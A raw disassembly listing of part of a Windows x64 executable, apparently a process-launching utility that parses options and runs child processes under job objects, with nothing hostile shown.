   140001e5e:	49 8b 73 18          	mov    0x18(%r11),%rsi
   140001e62:	49 8b e3             	mov    %r11,%rsp
   140001e65:	5f                   	pop    %rdi
   140001e66:	c3                   	ret
   140001e67:	cc                   	int3
   140001e68:	e9 b3 1f 02 00       	jmp    0x140023e20
   140001e6d:	cc                   	int3
   140001e6e:	cc                   	int3
   140001e6f:	cc                   	int3
   140001e70:	48 83 ec 28          	sub    $0x28,%rsp
   140001e74:	48 8b 09             	mov    (%rcx),%rcx
   140001e77:	e8 bc fe ff ff       	call   0x140001d38
   140001e7c:	33 c0                	xor    %eax,%eax
   140001e7e:	48 83 c4 28          	add    $0x28,%rsp
   140001e82:	c3                   	ret
   140001e83:	cc                   	int3
   140001e84:	48 83 ec 28          	sub    $0x28,%rsp
   140001e88:	c7 05 2e ac 02 00 ba 	movl   $0x6ba,0x2ac2e(%rip)        # 0x14002cac0
   140001e8f:	06 00 00 
   140001e92:	ff 15 48 35 02 00    	call   *0x23548(%rip)        # 0x1400253e0
   140001e98:	83 25 21 ac 02 00 00 	andl   $0x0,0x2ac21(%rip)        # 0x14002cac0
   140001e9f:	48 83 c4 28          	add    $0x28,%rsp
   140001ea3:	c3                   	ret
   140001ea4:	40 53                	rex push %rbx
   140001ea6:	48 83 ec 20          	sub    $0x20,%rsp
   140001eaa:	48 8b d9             	mov    %rcx,%rbx
   140001ead:	48 8d 15 bc ff ff ff 	lea    -0x44(%rip),%rdx        # 0x140001e70
   140001eb4:	33 c9                	xor    %ecx,%ecx
   140001eb6:	ff 15 64 34 02 00    	call   *0x23464(%rip)        # 0x140025320
   140001ebc:	48 8b c3             	mov    %rbx,%rax
   140001ebf:	48 83 c4 20          	add    $0x20,%rsp
   140001ec3:	5b                   	pop    %rbx
   140001ec4:	c3                   	ret
   140001ec5:	cc                   	int3
   140001ec6:	cc                   	int3
   140001ec7:	cc                   	int3
   140001ec8:	48 89 5c 24 08       	mov    %rbx,0x8(%rsp)
   140001ecd:	48 89 74 24 10       	mov    %rsi,0x10(%rsp)
   140001ed2:	57                   	push   %rdi
   140001ed3:	48 83 ec 20          	sub    $0x20,%rsp
   140001ed7:	48 8b 01             	mov    (%rcx),%rax
   140001eda:	33 ff                	xor    %edi,%edi
   140001edc:	48 8b d9             	mov    %rcx,%rbx
   140001edf:	89 79 08             	mov    %edi,0x8(%rcx)
   140001ee2:	48 8d 0d 27 40 02 00 	lea    0x24027(%rip),%rcx        # 0x140025f10
   140001ee9:	33 d2                	xor    %edx,%edx
   140001eeb:	66 89 38             	mov    %di,(%rax)
   140001eee:	e8 95 45 00 00       	call   0x140006488
   140001ef3:	48 85 c0             	test   %rax,%rax
   140001ef6:	74 4f                	je     0x140001f47
   140001ef8:	48 8b d0             	mov    %rax,%rdx
   140001efb:	48 8b cb             	mov    %rbx,%rcx
   140001efe:	e8 25 76 01 00       	call   0x140019528
   140001f03:	48 8b cb             	mov    %rbx,%rcx
   140001f06:	e8 f5 4d 00 00       	call   0x140006d00
   140001f0b:	44 8b 5b 08          	mov    0x8(%rbx),%r11d
   140001f0f:	48 8b 03             	mov    (%rbx),%rax
   140001f12:	41 8d 4b ff          	lea    -0x1(%r11),%ecx
   140001f16:	8d 77 5c             	lea    0x5c(%rdi),%esi
   140001f19:	66 39 34 48          	cmp    %si,(%rax,%rcx,2)
   140001f1d:	74 28                	je     0x140001f47
   140001f1f:	66 83 3c 48 2f       	cmpw   $0x2f,(%rax,%rcx,2)
   140001f24:	74 21                	je     0x140001f47
   140001f26:	44 39 5b 0c          	cmp    %r11d,0xc(%rbx)
   140001f2a:	75 08                	jne    0x140001f34
   140001f2c:	48 8b cb             	mov    %rbx,%rcx
   140001f2f:	e8 78 72 01 00       	call   0x1400191ac
   140001f34:	8b 53 08             	mov    0x8(%rbx),%edx
   140001f37:	48 8b 0b             	mov    (%rbx),%rcx
   140001f3a:	66 89 34 51          	mov    %si,(%rcx,%rdx,2)
   140001f3e:	ff c2                	inc    %edx
   140001f40:	66 89 3c 51          	mov    %di,(%rcx,%rdx,2)
   140001f44:	89 53 08             	mov    %edx,0x8(%rbx)
   140001f47:	48 8b 5c 24 30       	mov    0x30(%rsp),%rbx
   140001f4c:	48 8b 74 24 38       	mov    0x38(%rsp),%rsi
   140001f51:	48 83 c4 20          	add    $0x20,%rsp
   140001f55:	5f                   	pop    %rdi
   140001f56:	c3                   	ret
   140001f57:	cc                   	int3
   140001f58:	48 8b c4             	mov    %rsp,%rax
   140001f5b:	48 89 58 08          	mov    %rbx,0x8(%rax)
   140001f5f:	48 89 70 10          	mov    %rsi,0x10(%rax)
   140001f63:	48 89 78 18          	mov    %rdi,0x18(%rax)
   140001f67:	55                   	push   %rbp
   140001f68:	48 8d 68 a1          	lea    -0x5f(%rax),%rbp
   140001f6c:	48 81 ec b0 00 00 00 	sub    $0xb0,%rsp
   140001f73:	48 8b f1             	mov    %rcx,%rsi
   140001f76:	48 8d 4d c7          	lea    -0x39(%rbp),%rcx
   140001f7a:	49 8b d8             	mov    %r8,%rbx
   140001f7d:	8b fa                	mov    %edx,%edi
   140001f7f:	e8 d4 74 01 00       	call   0x140019458
   140001f84:	48 8d 4d d7          	lea    -0x29(%rbp),%rcx
   140001f88:	e8 cb 74 01 00       	call   0x140019458
   140001f8d:	33 d2                	xor    %edx,%edx
   140001f8f:	48 8d 4d e7          	lea    -0x19(%rbp),%rcx
   140001f93:	44 8d 42 70          	lea    0x70(%rdx),%r8d
   140001f97:	e8 8a 1e 02 00       	call   0x140023e26
   140001f9c:	48 89 5d 0f          	mov    %rbx,0xf(%rbp)
   140001fa0:	bb 01 00 00 00       	mov    $0x1,%ebx
   140001fa5:	ba 40 07 00 00       	mov    $0x740,%edx
   140001faa:	c7 45 e7 70 00 00 00 	movl   $0x70,-0x19(%rbp)
   140001fb1:	c7 45 17 0a 00 00 00 	movl   $0xa,0x17(%rbp)
   140001fb8:	89 55 eb             	mov    %edx,-0x15(%rbp)
   140001fbb:	40 84 fb             	test   %dil,%bl
   140001fbe:	74 0c                	je     0x140001fcc
   140001fc0:	83 65 17 00          	andl   $0x0,0x17(%rbp)
   140001fc4:	ba 40 87 00 00       	mov    $0x8740,%edx
   140001fc9:	89 55 eb             	mov    %edx,-0x15(%rbp)
   140001fcc:	40 f6 c7 02          	test   $0x2,%dil
   140001fd0:	48 8d 05 49 41 02 00 	lea    0x24149(%rip),%rax        # 0x140026120
   140001fd7:	48 0f 44 45 f7       	cmove  -0x9(%rbp),%rax
   140001fdc:	81 e7 00 00 01 00    	and    $0x10000,%edi
   140001fe2:	48 89 45 f7          	mov    %rax,-0x9(%rbp)
   140001fe6:	75 07                	jne    0x140001fef
   140001fe8:	0f ba ea 08          	bts    $0x8,%edx
   140001fec:	89 55 eb             	mov    %edx,-0x15(%rbp)
   140001fef:	48 8b 0d ea aa 02 00 	mov    0x2aaea(%rip),%rcx        # 0x14002cae0
   140001ff6:	ba 05 00 00 00       	mov    $0x5,%edx
   140001ffb:	48 89 4d ef          	mov    %rcx,-0x11(%rbp)
   140001fff:	ff 15 b3 35 02 00    	call   *0x235b3(%rip)        # 0x1400255b8
   140002005:	48 8b 4d ef          	mov    -0x11(%rbp),%rcx
   140002009:	ff 15 b1 35 02 00    	call   *0x235b1(%rip)        # 0x1400255c0
   14000200f:	48 8d 55 c7          	lea    -0x39(%rbp),%rdx
   140002013:	48 8b ce             	mov    %rsi,%rcx
   140002016:	e8 6d 18 00 00       	call   0x140003888
   14000201b:	48 8d 4d d7          	lea    -0x29(%rbp),%rcx
   14000201f:	48 8b d0             	mov    %rax,%rdx
   140002022:	e8 01 75 01 00       	call   0x140019528
   140002027:	83 7d cf 00          	cmpl   $0x0,-0x31(%rbp)
   14000202b:	74 3d                	je     0x14000206a
   14000202d:	48 8b 45 c7          	mov    -0x39(%rbp),%rax
   140002031:	48 8d 4d e7          	lea    -0x19(%rbp),%rcx
   140002035:	48 89 45 ff          	mov    %rax,-0x1(%rbp)
   140002039:	48 8b 45 d7          	mov    -0x29(%rbp),%rax
   14000203d:	48 89 45 07          	mov    %rax,0x7(%rbp)
   140002041:	ff 15 a1 33 02 00    	call   *0x233a1(%rip)        # 0x1400253e8
   140002047:	85 c0                	test   %eax,%eax
   140002049:	74 1d                	je     0x140002068
   14000204b:	85 ff                	test   %edi,%edi
   14000204d:	75 0d                	jne    0x14000205c
   14000204f:	48 8b 4d 4f          	mov    0x4f(%rbp),%rcx
   140002053:	83 ca ff             	or     $0xffffffff,%edx
   140002056:	ff 15 dc 32 02 00    	call   *0x232dc(%rip)        # 0x140025338
   14000205c:	48 8b 4d 4f          	mov    0x4f(%rbp),%rcx
   140002060:	ff 15 ca 32 02 00    	call   *0x232ca(%rip)        # 0x140025330
   140002066:	eb 02                	jmp    0x14000206a
   140002068:	33 db                	xor    %ebx,%ebx
   14000206a:	48 8b 4d d7          	mov    -0x29(%rbp),%rcx
   14000206e:	e8 fb 1c 02 00       	call   0x140023d6e
   140002073:	48 8b 4d c7          	mov    -0x39(%rbp),%rcx
   140002077:	e8 f2 1c 02 00       	call   0x140023d6e
   14000207c:	4c 8d 9c 24 b0 00 00 	lea    0xb0(%rsp),%r11
   140002083:	00 
   140002084:	8b c3                	mov    %ebx,%eax
   140002086:	49 8b 5b 10          	mov    0x10(%r11),%rbx
   14000208a:	49 8b 73 18          	mov    0x18(%r11),%rsi
   14000208e:	49 8b 7b 20          	mov    0x20(%r11),%rdi
   140002092:	49 8b e3             	mov    %r11,%rsp
   140002095:	5d                   	pop    %rbp
   140002096:	c3                   	ret
   140002097:	cc                   	int3
   140002098:	48 89 5c 24 08       	mov    %rbx,0x8(%rsp)
   14000209d:	55                   	push   %rbp
   14000209e:	56                   	push   %rsi
   14000209f:	57                   	push   %rdi
   1400020a0:	48 8d ac 24 60 ff ff 	lea    -0xa0(%rsp),%rbp
   1400020a7:	ff 
   1400020a8:	48 81 ec a0 01 00 00 	sub    $0x1a0,%rsp
   1400020af:	48 8b f9             	mov    %rcx,%rdi
   1400020b2:	48 8d 4d 98          	lea    -0x68(%rbp),%rcx
   1400020b6:	41 8b d8             	mov    %r8d,%ebx
   1400020b9:	48 8b f2             	mov    %rdx,%rsi
   1400020bc:	e8 97 73 01 00       	call   0x140019458
   1400020c1:	48 8d 4d a8          	lea    -0x58(%rbp),%rcx
   1400020c5:	e8 8e 73 01 00       	call   0x140019458
   1400020ca:	ff 15 c0 32 02 00    	call   *0x232c0(%rip)        # 0x140025390
   1400020d0:	48 8d 55 98          	lea    -0x68(%rbp),%rdx
   1400020d4:	48 8b c8             	mov    %rax,%rcx
   1400020d7:	e8 ac 17 00 00       	call   0x140003888
   1400020dc:	4c 8d 45 98          	lea    -0x68(%rbp),%r8
   1400020e0:	48 8d 15 89 3f 02 00 	lea    0x23f89(%rip),%rdx        # 0x140026070
   1400020e7:	48 8d 4d e8          	lea    -0x18(%rbp),%rcx
   1400020eb:	e8 24 73 01 00       	call   0x140019414
   1400020f0:	4c 8d 05 59 40 02 00 	lea    0x24059(%rip),%r8        # 0x140026150
   1400020f7:	48 8d 4d d8          	lea    -0x28(%rbp),%rcx
   1400020fb:	48 8b d0             	mov    %rax,%rdx
   1400020fe:	e8 cd 72 01 00       	call   0x1400193d0
   140002103:	4c 8d 05 2e 40 02 00 	lea    0x2402e(%rip),%r8        # 0x140026138
   14000210a:	48 8d 4d f8          	lea    -0x8(%rbp),%rcx
   14000210e:	48 8b d0             	mov    %rax,%rdx
   140002111:	e8 ba 72 01 00       	call   0x1400193d0
   140002116:	48 8d 4c 24 50       	lea    0x50(%rsp),%rcx
   14000211b:	41 b8 3a 00 00 00    	mov    $0x3a,%r8d
   140002121:	48 8b d0             	mov    %rax,%rdx
   140002124:	e8 97 71 01 00       	call   0x1400192c0
   140002129:	44 8d 43 30          	lea    0x30(%rbx),%r8d
   14000212d:	48 8d 54 24 50       	lea    0x50(%rsp),%rdx
   140002132:	48 8d 4d b8          	lea    -0x48(%rbp),%rcx
   140002136:	e8 85 71 01 00       	call   0x1400192c0
   14000213b:	48 8d 55 b8          	lea    -0x48(%rbp),%rdx
   14000213f:	48 8d 4d 88          	lea    -0x78(%rbp),%rcx
   140002143:	41 b8 20 00 00 00    	mov    $0x20,%r8d
   140002149:	e8 72 71 01 00       	call   0x1400192c0
   14000214e:	48 8d 55 88          	lea    -0x78(%rbp),%rdx
   140002152:	48 8d 4c 24 78       	lea    0x78(%rsp),%rcx
   140002157:	41 b8 22 00 00 00    	mov    $0x22,%r8d
   14000215d:	e8 5e 71 01 00       	call   0x1400192c0
   140002162:	48 8d 54 24 78       	lea    0x78(%rsp),%rdx
   140002167:	48 8d 4d 18          	lea    0x18(%rbp),%rcx
   14000216b:	4c 8b c7             	mov    %rdi,%r8
   14000216e:	e8 5d 72 01 00       	call   0x1400193d0
   140002173:	4c 8d 05 b2 3f 02 00 	lea    0x23fb2(%rip),%r8        # 0x14002612c
   14000217a:	48 8d 4d 08          	lea    0x8(%rbp),%rcx
   14000217e:	48 8b d0             	mov    %rax,%rdx
   140002181:	e8 4a 72 01 00       	call   0x1400193d0
   140002186:	48 8d 4d c8          	lea    -0x38(%rbp),%rcx
   14000218a:	4c 8b c6             	mov    %rsi,%r8
   14000218d:	48 8b d0             	mov    %rax,%rdx
   140002190:	e8 3b 72 01 00       	call   0x1400193d0
   140002195:	48 8d 4d a8          	lea    -0x58(%rbp),%rcx
   140002199:	48 8b 10             	mov    (%rax),%rdx
   14000219c:	e8 87 73 01 00       	call   0x140019528
   1400021a1:	48 8b 4d c8          	mov    -0x38(%rbp),%rcx
   1400021a5:	e8 c4 1b 02 00       	call   0x140023d6e
   1400021aa:	48 8b 4d 08          	mov    0x8(%rbp),%rcx
   1400021ae:	e8 bb 1b 02 00       	call   0x140023d6e
   1400021b3:	48 8b 4d 18          	mov    0x18(%rbp),%rcx
   1400021b7:	e8 b2 1b 02 00       	call   0x140023d6e
   1400021bc:	48 8b 4c 24 78       	mov    0x78(%rsp),%rcx
   1400021c1:	e8 a8 1b 02 00       	call   0x140023d6e
   1400021c6:	48 8b 4d 88          	mov    -0x78(%rbp),%rcx
   1400021ca:	e8 9f 1b 02 00       	call   0x140023d6e
   1400021cf:	48 8b 4d b8          	mov    -0x48(%rbp),%rcx
   1400021d3:	e8 96 1b 02 00       	call   0x140023d6e
   1400021d8:	48 8b 4c 24 50       	mov    0x50(%rsp),%rcx
   1400021dd:	e8 8c 1b 02 00       	call   0x140023d6e
   1400021e2:	48 8b 4d f8          	mov    -0x8(%rbp),%rcx
   1400021e6:	e8 83 1b 02 00       	call   0x140023d6e
   1400021eb:	48 8b 4d d8          	mov    -0x28(%rbp),%rcx
   1400021ef:	e8 7a 1b 02 00       	call   0x140023d6e
   1400021f4:	48 8b 4d e8          	mov    -0x18(%rbp),%rcx
   1400021f8:	e8 71 1b 02 00       	call   0x140023d6e
   1400021fd:	48 8d 4d 30          	lea    0x30(%rbp),%rcx
   140002201:	c7 45 30 68 00 00 00 	movl   $0x68,0x30(%rbp)
   140002208:	ff 15 7a 31 02 00    	call   *0x2317a(%rip)        # 0x140025388
   14000220e:	4c 8d 5c 24 60       	lea    0x60(%rsp),%r11
   140002213:	48 8d 45 30          	lea    0x30(%rbp),%rax
   140002217:	4c 89 5c 24 48       	mov    %r11,0x48(%rsp)
   14000221c:	48 89 44 24 40       	mov    %rax,0x40(%rsp)
   140002221:	48 8b 05 b8 aa 02 00 	mov    0x2aab8(%rip),%rax        # 0x14002cce0
   140002228:	48 8b 55 a8          	mov    -0x58(%rbp),%rdx
   14000222c:	45 33 c9             	xor    %r9d,%r9d
   14000222f:	48 89 44 24 38       	mov    %rax,0x38(%rsp)
   140002234:	48 83 64 24 30 00    	andq   $0x0,0x30(%rsp)
   14000223a:	45 33 c0             	xor    %r8d,%r8d
   14000223d:	33 c9                	xor    %ecx,%ecx
   14000223f:	c7 44 24 28 04 00 00 	movl   $0x1000004,0x28(%rsp)
   140002246:	01 
   140002247:	c7 44 24 20 01 00 00 	movl   $0x1,0x20(%rsp)
   14000224e:	00 
   14000224f:	ff 15 2b 31 02 00    	call   *0x2312b(%rip)        # 0x140025380
   140002255:	85 c0                	test   %eax,%eax
   140002257:	75 0d                	jne    0x140002266
   140002259:	ff 15 19 31 02 00    	call   *0x23119(%rip)        # 0x140025378
   14000225f:	8b d8                	mov    %eax,%ebx
   140002261:	e9 17 01 00 00       	jmp    0x14000237d
   140002266:	33 d2                	xor    %edx,%edx
   140002268:	33 c9                	xor    %ecx,%ecx
   14000226a:	33 db                	xor    %ebx,%ebx
   14000226c:	ff 15 fe 30 02 00    	call   *0x230fe(%rip)        # 0x140025370
   140002272:	83 ce ff             	or     $0xffffffff,%esi
   140002275:	48 8b f8             	mov    %rax,%rdi
   140002278:	48 85 c0             	test   %rax,%rax
   14000227b:	0f 84 8a 00 00 00    	je     0x14000230b
   140002281:	48 8b 54 24 60       	mov    0x60(%rsp),%rdx
   140002286:	48 8b c8             	mov    %rax,%rcx
   140002289:	ff 15 d9 30 02 00    	call   *0x230d9(%rip)        # 0x140025368
   14000228f:	85 c0                	test   %eax,%eax
   140002291:	74 78                	je     0x14000230b
   140002293:	44 8d 43 01          	lea    0x1(%rbx),%r8d
   140002297:	45 33 c9             	xor    %r9d,%r9d
   14000229a:	33 d2                	xor    %edx,%edx
   14000229c:	48 83 c9 ff          	or     $0xffffffffffffffff,%rcx
   1400022a0:	ff 15 ba 30 02 00    	call   *0x230ba(%rip)        # 0x140025360
   1400022a6:	48 8b d8             	mov    %rax,%rbx
   1400022a9:	48 85 c0             	test   %rax,%rax
   1400022ac:	74 5d                	je     0x14000230b
   1400022ae:	41 b9 10 00 00 00    	mov    $0x10,%r9d
   1400022b4:	4c 8d 44 24 50       	lea    0x50(%rsp),%r8
   1400022b9:	48 8b cf             	mov    %rdi,%rcx
   1400022bc:	41 8d 51 f7          	lea    -0x9(%r9),%edx
   1400022c0:	48 c7 44 24 50 01 00 	movq   $0x1,0x50(%rsp)
   1400022c7:	00 00 
   1400022c9:	48 89 44 24 58       	mov    %rax,0x58(%rsp)
   1400022ce:	ff 15 84 30 02 00    	call   *0x23084(%rip)        # 0x140025358
   1400022d4:	48 8b 4c 24 68       	mov    0x68(%rsp),%rcx
   1400022d9:	ff 15 71 30 02 00    	call   *0x23071(%rip)        # 0x140025350
   1400022df:	eb 09                	jmp    0x1400022ea
   1400022e1:	83 bd d0 00 00 00 04 	cmpl   $0x4,0xd0(%rbp)
   1400022e8:	74 39                	je     0x140002323
   1400022ea:	4c 8d 4d 88          	lea    -0x78(%rbp),%r9
   1400022ee:	4c 8d 44 24 78       	lea    0x78(%rsp),%r8
   1400022f3:	48 8d 95 d0 00 00 00 	lea    0xd0(%rbp),%rdx
   1400022fa:	48 8b cb             	mov    %rbx,%rcx
   1400022fd:	89 74 24 20          	mov    %esi,0x20(%rsp)
   140002301:	ff 15 41 30 02 00    	call   *0x23041(%rip)        # 0x140025348
   140002307:	85 c0                	test   %eax,%eax
   140002309:	75 d6                	jne    0x1400022e1
   14000230b:	48 8b 4c 24 68       	mov    0x68(%rsp),%rcx
   140002310:	ff 15 3a 30 02 00    	call   *0x2303a(%rip)        # 0x140025350
   140002316:	48 8b 4c 24 60       	mov    0x60(%rsp),%rcx
   14000231b:	8b d6                	mov    %esi,%edx
   14000231d:	ff 15 15 30 02 00    	call   *0x23015(%rip)        # 0x140025338
   140002323:	48 8b 4c 24 68       	mov    0x68(%rsp),%rcx
   140002328:	ff 15 02 30 02 00    	call   *0x23002(%rip)        # 0x140025330
   14000232e:	48 8b 4c 24 60       	mov    0x60(%rsp),%rcx
   140002333:	48 8d 95 d8 00 00 00 	lea    0xd8(%rbp),%rdx
   14000233a:	ff 15 00 30 02 00    	call   *0x23000(%rip)        # 0x140025340
   140002340:	85 c0                	test   %eax,%eax
   140002342:	75 0c                	jne    0x140002350
   140002344:	ff 15 2e 30 02 00    	call   *0x2302e(%rip)        # 0x140025378
   14000234a:	89 85 d8 00 00 00    	mov    %eax,0xd8(%rbp)
   140002350:	48 8b 4c 24 60       	mov    0x60(%rsp),%rcx
   140002355:	ff 15 d5 2f 02 00    	call   *0x22fd5(%rip)        # 0x140025330
   14000235b:	48 85 db             	test   %rbx,%rbx
   14000235e:	74 09                	je     0x140002369
   140002360:	48 8b cb             	mov    %rbx,%rcx
   140002363:	ff 15 c7 2f 02 00    	call   *0x22fc7(%rip)        # 0x140025330
   140002369:	48 85 ff             	test   %rdi,%rdi
   14000236c:	74 09                	je     0x140002377
   14000236e:	48 8b cf             	mov    %rdi,%rcx
   140002371:	ff 15 b9 2f 02 00    	call   *0x22fb9(%rip)        # 0x140025330
   140002377:	8b 9d d8 00 00 00    	mov    0xd8(%rbp),%ebx
   14000237d:	48 8b 4d a8          	mov    -0x58(%rbp),%rcx
   140002381:	e8 e8 19 02 00       	call   0x140023d6e
   140002386:	48 8b 4d 98          	mov    -0x68(%rbp),%rcx
   14000238a:	e8 df 19 02 00       	call   0x140023d6e
   14000238f:	8b c3                	mov    %ebx,%eax
   140002391:	48 8b 9c 24 c0 01 00 	mov    0x1c0(%rsp),%rbx
   140002398:	00 
   140002399:	48 81 c4 a0 01 00 00 	add    $0x1a0,%rsp
   1400023a0:	5f                   	pop    %rdi
   1400023a1:	5e                   	pop    %rsi
   1400023a2:	5d                   	pop    %rbp
   1400023a3:	c3                   	ret
   1400023a4:	48 89 5c 24 08       	mov    %rbx,0x8(%rsp)
   1400023a9:	57                   	push   %rdi
   1400023aa:	48 83 ec 20          	sub    $0x20,%rsp
   1400023ae:	33 ff                	xor    %edi,%edi
   1400023b0:	66 83 39 3a          	cmpw   $0x3a,(%rcx)
   1400023b4:	48 8b d9             	mov    %rcx,%rbx
   1400023b7:	8b c7                	mov    %edi,%eax
   1400023b9:	75 36                	jne    0x1400023f1
   1400023bb:	48 83 c1 02          	add    $0x2,%rcx
   1400023bf:	66 83 39 30          	cmpw   $0x30,(%rcx)
   1400023c3:	72 2c                	jb     0x1400023f1
   1400023c5:	66 83 39 39          	cmpw   $0x39,(%rcx)
   1400023c9:	77 26                	ja     0x1400023f1
   1400023cb:	ff 15 4f 32 02 00    	call   *0x2324f(%rip)        # 0x140025620
   1400023d1:	eb 04                	jmp    0x1400023d7
   1400023d3:	48 83 c3 02          	add    $0x2,%rbx
   1400023d7:	66 83 3b 20          	cmpw   $0x20,(%rbx)
   1400023db:	77 f6                	ja     0x1400023d3
   1400023dd:	eb 0a                	jmp    0x1400023e9
   1400023df:	66 83 f9 20          	cmp    $0x20,%cx
   1400023e3:	77 0c                	ja     0x1400023f1
   1400023e5:	48 83 c3 02          	add    $0x2,%rbx
   1400023e9:	0f b7 0b             	movzwl (%rbx),%ecx
   1400023ec:	66 85 c9             	test   %cx,%cx
   1400023ef:	75 ee                	jne    0x1400023df
   1400023f1:	45 33 c0             	xor    %r8d,%r8d
   1400023f4:	8b d0                	mov    %eax,%edx
   1400023f6:	48 8b cb             	mov    %rbx,%rcx
   1400023f9:	e8 5a fb ff ff       	call   0x140001f58
   1400023fe:	85 c0                	test   %eax,%eax
   140002400:	75 08                	jne    0x14000240a
   140002402:	ff 15 70 2f 02 00    	call   *0x22f70(%rip)        # 0x140025378
   140002408:	eb 02                	jmp    0x14000240c
   14000240a:	33 c0                	xor    %eax,%eax
   14000240c:	48 8b 5c 24 30       	mov    0x30(%rsp),%rbx
   140002411:	48 83 c4 20          	add    $0x20,%rsp
   140002415:	5f                   	pop    %rdi
   140002416:	c3                   	ret
   140002417:	cc                   	int3
   140002418:	48 8b c4             	mov    %rsp,%rax
   14000241b:	48 89 58 08          	mov    %rbx,0x8(%rax)
   14000241f:	4c 89 48 20          	mov    %r9,0x20(%rax)
   140002423:	48 89 50 10          	mov    %rdx,0x10(%rax)
   140002427:	55                   	push   %rbp
   140002428:	56                   	push   %rsi
   140002429:	57                   	push   %rdi
   14000242a:	41 54                	push   %r12
   14000242c:	41 55                	push   %r13
   14000242e:	41 56                	push   %r14
   140002430:	41 57                	push   %r15
   140002432:	48 8d 68 a9          	lea    -0x57(%rax),%rbp
   140002436:	48 81 ec b0 00 00 00 	sub    $0xb0,%rsp
   14000243d:	48 8b d9             	mov    %rcx,%rbx
   140002440:	48 8d 4d 8f          	lea    -0x71(%rbp),%rcx
   140002444:	45 33 e4             	xor    %r12d,%r12d
   140002447:	45 8a f8             	mov    %r8b,%r15b
   14000244a:	48 8b f2             	mov    %rdx,%rsi
   14000244d:	41 8b fc             	mov    %r12d,%edi
   140002450:	e8 03 70 01 00       	call   0x140019458
   140002455:	48 8d 4d ff          	lea    -0x1(%rbp),%rcx
   140002459:	48 8b d6             	mov    %rsi,%rdx
   14000245c:	e8 27 2d 00 00       	call   0x140005188
   140002461:	48 8b cb             	mov    %rbx,%rcx
   140002464:	45 8b ec             	mov    %r12d,%r13d
   140002467:	45 8a f4             	mov    %r12b,%r14b
   14000246a:	e8 91 48 00 00       	call   0x140006d00
   14000246f:	48 8b 1b             	mov    (%rbx),%rbx
   140002472:	41 8d 74 24 01       	lea    0x1(%r12),%esi
   140002477:	48 8d 15 2a 3d 02 00 	lea    0x23d2a(%rip),%rdx        # 0x1400261a8
   14000247e:	45 33 c0             	xor    %r8d,%r8d
   140002481:	48 8b cb             	mov    %rbx,%rcx
   140002484:	e8 63 2a 00 00       	call   0x140004eec
   140002489:	48 85 c0             	test   %rax,%rax
   14000248c:	74 08                	je     0x140002496
   14000248e:	48 8b d8             	mov    %rax,%rbx
   140002491:	44 8a f6             	mov    %sil,%r14b
   140002494:	eb e1                	jmp    0x140002477
   140002496:	48 8d 15 fb 3c 02 00 	lea    0x23cfb(%rip),%rdx        # 0x140026198
   14000249d:	45 33 c0             	xor    %r8d,%r8d
   1400024a0:	48 8b cb             	mov    %rbx,%rcx
   1400024a3:	e8 44 2a 00 00       	call   0x140004eec
   1400024a8:	48 85 c0             	test   %rax,%rax
   1400024ab:	74 07                	je     0x1400024b4
   1400024ad:	48 8b d8             	mov    %rax,%rbx
   1400024b0:	0b fe                	or     %esi,%edi
   1400024b2:	eb c3                	jmp    0x140002477
   1400024b4:	48 8d 15 cd 3c 02 00 	lea    0x23ccd(%rip),%rdx        # 0x140026188
   1400024bb:	45 33 c0             	xor    %r8d,%r8d
   1400024be:	48 8b cb             	mov    %rbx,%rcx
   1400024c1:	e8 26 2a 00 00       	call   0x140004eec
   1400024c6:	48 85 c0             	test   %rax,%rax
   1400024c9:	74 0e                	je     0x1400024d9
   1400024cb:	44 38 25 2e a6 02 00 	cmp    %r12b,0x2a62e(%rip)        # 0x14002cb00
   1400024d2:	48 8b d8             	mov    %rax,%rbx
   1400024d5:	74 a0                	je     0x140002477
   1400024d7:	eb 1a                	jmp    0x1400024f3
   1400024d9:	48 8d 15 90 3c 02 00 	lea    0x23c90(%rip),%rdx        # 0x140026170
   1400024e0:	45 33 c0             	xor    %r8d,%r8d
   1400024e3:	48 8b cb             	mov    %rbx,%rcx
   1400024e6:	e8 01 2a 00 00       	call   0x140004eec
   1400024eb:	48 85 c0             	test   %rax,%rax
   1400024ee:	74 0c                	je     0x1400024fc
   1400024f0:	48 8b d8             	mov    %rax,%rbx
   1400024f3:	0f ba ef 10          	bts    $0x10,%edi
   1400024f7:	e9 7b ff ff ff       	jmp    0x140002477
   1400024fc:	48 8d 15 cd 3b 02 00 	lea    0x23bcd(%rip),%rdx        # 0x1400260d0
   140002503:	41 b8 02 00 00 00    	mov    $0x2,%r8d
   140002509:	48 8b cb             	mov    %rbx,%rcx
   14000250c:	e8 db 29 00 00       	call   0x140004eec
   140002511:	4c 8b e0             	mov    %rax,%r12
   140002514:	48 85 c0             	test   %rax,%rax
   140002517:	74 24                	je     0x14000253d
   140002519:	83 3d 64 a2 02 00 ff 	cmpl   $0xffffffff,0x2a264(%rip)        # 0x14002c784
   140002520:	75 10                	jne    0x140002532
   140002522:	48 8d 4b 04          	lea    0x4(%rbx),%rcx
   140002526:	ff 15 f4 30 02 00    	call   *0x230f4(%rip)        # 0x140025620
   14000252c:	89 05 52 a2 02 00    	mov    %eax,0x2a252(%rip)        # 0x14002c784
   140002532:	49 8b dc             	mov    %r12,%rbx
   140002535:	45 33 e4             	xor    %r12d,%r12d
   140002538:	e9 3a ff ff ff       	jmp    0x140002477
   14000253d:	48 8d 15 24 3c 02 00 	lea    0x23c24(%rip),%rdx        # 0x140026168
   140002544:	41 b8 03 00 00 00    	mov    $0x3,%r8d
   14000254a:	48 8b cb             	mov    %rbx,%rcx
   14000254d:	e8 9a 29 00 00       	call   0x140004eec
   140002552:	45 33 e4             	xor    %r12d,%r12d
   140002555:	48 85 c0             	test   %rax,%rax
   140002558:	75 19                	jne    0x140002573
   14000255a:	45 8d 44 24 03       	lea    0x3(%r12),%r8d
   14000255f:	48 8d 15 fa 3b 02 00 	lea    0x23bfa(%rip),%rdx        # 0x140026160
   140002566:	48 8b cb             	mov    %rbx,%rcx
   140002569:	e8 7e 29 00 00       	call   0x140004eec
   14000256e:	48 85 c0             	test   %rax,%rax
   140002571:	74 08                	je     0x14000257b
   140002573:	48 8b d8             	mov    %rax,%rbx
   140002576:	e9 fc fe ff ff       	jmp    0x140002477
   14000257b:	48 8b cb             	mov    %rbx,%rcx
   14000257e:	e8 15 2a 00 00       	call   0x140004f98
   140002583:	48 85 c0             	test   %rax,%rax
   140002586:	74 0b                	je     0x140002593
   140002588:	48 8b d8             	mov    %rax,%rbx
   14000258b:	44 8b ee             	mov    %esi,%r13d
   14000258e:	e9 e4 fe ff ff       	jmp    0x140002477
   140002593:	48 8b cb             	mov    %rbx,%rcx
   140002596:	e8 81 2a 00 00       	call   0x14000501c
   14000259b:	48 85 c0             	test   %rax,%rax
